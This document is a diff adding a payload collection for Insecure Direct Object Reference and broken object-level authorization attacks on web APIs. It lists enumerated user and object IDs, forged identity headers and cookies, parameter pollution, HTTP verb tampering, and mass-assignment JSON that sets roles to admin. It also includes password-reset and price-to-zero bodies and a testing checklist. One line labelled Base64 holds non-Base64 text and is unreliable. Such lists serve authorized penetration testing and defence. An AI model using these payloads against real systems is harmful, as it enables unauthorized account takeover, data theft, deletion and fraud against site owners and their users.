@@ -1,0 +1,328 @@
+# IDOR Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Insecure Direct Object Reference
+
+# ============================================
+# IDOR - USER ID ENUMERATION
+# ============================================
+
+# Sequential IDs
+/user/1
+/user/2
+/user/3
+/user/100
+/user/1000
+
+# UUID patterns
+/user/550e8400-e29b-41d4-a716-446655440000
+/user/a1b2c3d4-e5f6-7890-abcd-ef1234567890
+
+# Email as ID
+/user/admin@example.com
+/user/test@test.com
+
+# ============================================
+# HTTP METHODS
+# ============================================
+
+GET /api/users/1
+POST /api/users/1
+PUT /api/users/1
+DELETE /api/users/1
+PATCH /api/users/1
+
+# ============================================
+# HTTP HEADERS
+# ============================================
+
+X-User-ID: 1
+X-User-ID: 100
+X-UID: 1
+X-UID: 100
+X-Forwarded-User: admin
+X-Original-User: admin
+X-Remote-User: admin
+X-Api-Key: admin
+Authorization: Bearer admin-token
+
+# ============================================
+# COOKIE-BASED IDOR
+# ============================================
+
+Cookie: user_id=1
+Cookie: user_id=100
+Cookie: id=1
+Cookie: uid=1
+Cookie: customer_id=1
+
+# ============================================
+# PARAMETER POLLUTION
+# ============================================
+
+/api/users?id=1&id=2
+/api/users?id=1,2
+/api/users?id=1 2
+/api/users?user_id=1&user_id=2
+
+# ============================================
+# HTTP VERB TAMPERING
+# ============================================
+
+# Change GET to POST
+POST /api/users/1
+
+# Change POST to GET
+GET /api/users/1/delete
+
+# Change to PUT/PATCH
+PUT /api/users/1
+PATCH /api/users/1
+
+# Change to DELETE
+DELETE /api/users/1
+
+# ============================================
+# MISSING AUTHORIZATION
+# ============================================
+
+# Admin endpoints without auth
+/admin/users
+/admin/users/list
+/admin/settings
+/admin/config
+/admin/logs
+/api/admin/users
+
+# Status codes that may indicate IDOR
+# 200 - Success
+# 201 - Created
+# 204 - No Content
+
+# ============================================
+# OBJECT REFERENCE
+# ============================================
+
+# File IDs
+/file/1
+/file/2
+/file/100
+
+# Document IDs
+/document/1
+/document/2
+
+# Transaction IDs
+/transaction/1
+/transaction/100
+
+# Order IDs
+/order/1
+/order/100
+
+# Invoice IDs
+/invoice/1
+/invoice/100
+
+# Product IDs
+/product/1
+/product/100
+
+# ============================================
+# URL ENCODING BYPASS
+# ============================================
+
+/api/users/%31
+/api/users/%32
+/api/users/%2F..
+
+# ============================================
+# JSON BODY MANIPULATION
+# ============================================
+
+{"user_id": 1}
+{"user_id": 100}
+{"user_id": "admin"}
+{"user_id": 1, "role": "admin"}
+{"user": {"id": 1}}
+
+# ============================================
+# REFERENCE MANIPULATION
+# ============================================
+
+# Email change
+{"email": "admin@target.com", "original_email": "user@target.com"}
+
+# Password reset
+{"user_id": 1, "new_password": "hacked123"}
+
+# Profile update
+{"user_id": 1, "role": "admin"}
+
+# ============================================
+# FORWARD IDOR
+# ============================================
+
+# Direct object reference
+/users/1
+/users/2
+
+# Indirect reference map
+/users/1
+/users/2
+
+# ============================================
+# BACKWARD IDOR
+# ============================================
+
+# Access historical data
+/orders/1
+/orders/1/history
+/orders/1/refunds
+
+# ============================================
+# IDOR IN FILE UPLOAD
+# ============================================
+
+POST /api/upload
+Content-Disposition: form-data; name="file"; filename="test.jpg"
+Content-Type: image/jpeg
+
+# Change user_id in path
+POST /api/users/1/upload
+
+# ============================================
+# IDOR IN DELETE
+# ============================================
+
+DELETE /api/users/1
+DELETE /api/users/100
+DELETE /api/comments/1
+DELETE /api/posts/1
+
+# ============================================
+# IDOR IN EXPORT
+# ============================================
+
+/export/users
+/export/users?format=csv
+/export/users?user_id=1
+/export/data?user_id=1
+
+# ============================================
+# BOLA (Broken Object Level Authorization)
+# ============================================
+
+# API endpoints to test
+/api/v1/users/{id}
+/api/v1/accounts/{id}
+/api/v1/orders/{id}
+/api/v1/products/{id}
+/api/v1/transactions/{id}
+
+/api/users/{id}
+/api/customers/{id}
+/api/profiles/{id}
+/api/addresses/{id}
+/api/payments/{id}
+
+# GraphQL
+query {
+  user(id: 1) {
+    id
+    email
+    role
+  }
+}
+
+# ============================================
+# INDIRECT IDOR
+# ============================================
+
+# Resource sharing
+/share?resource_id=1&user_id=2
+/transfer?to=2&amount=100
+
+# ============================================
+# MASS ASSIGNMENT
+# ============================================
+
+{"username": "test", "role": "admin", "verified": true}
+{"username": "test", "is_admin": 1}
+{"username": "test", "permissions": ["admin", "write", "read"]}
+
+# ============================================
+# ID ENCODING
+# ============================================
+
+# Base64
+/api/users/MTIzNDU=
+/api/users/的基础知识
+
+# Hex
+/api/users/0x1
+/api/users/0x2
+
+# Hash (if predictable)
+/api/users/md5-hash
+/api/users/sha256-hash
+
+# ============================================
+# CACHE ENUMERATION
+# ============================================
+
+# Test with different users
+User-Agent: Admin
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+
+# ============================================
+# ROLE-BASED IDOR
+# ============================================
+
+# Try to access admin resources with user account
+/admin/dashboard
+/admin/users
+/admin/settings
+/admin/logs
+
+# ============================================
+# API VERSION IDOR
+# ============================================
+
+/api/v1/users/1
+/api/v2/users/1
+/api/v3/users/1
+/api/latest/users/1
+
+# ============================================
+# MULTI-STEP IDOR
+# ============================================
+
+# Step 1 - Create resource
+POST /api/orders
+{"product_id": 1, "quantity": 1}
+
+# Step 2 - Modify price (IDOR)
+/api/orders/1
+{"price": 0}
+
+# ============================================
+# IDOR IN API KEY
+# ============================================
+
+# Test with other users' API keys
+/api?api_key=user1_key
+/api?api_key=user2_key
+
+# ============================================
+# BOLA TESTING CHECKLIST
+# ============================================
+
+# 1. Identify all object references in API
+# 2. Test sequential IDs
+# 3. Test UUIDs
+# 4. Test with different HTTP methods
+# 5. Test with different roles
+# 6. Test parameter pollution
+# 7. Test header manipulation
+
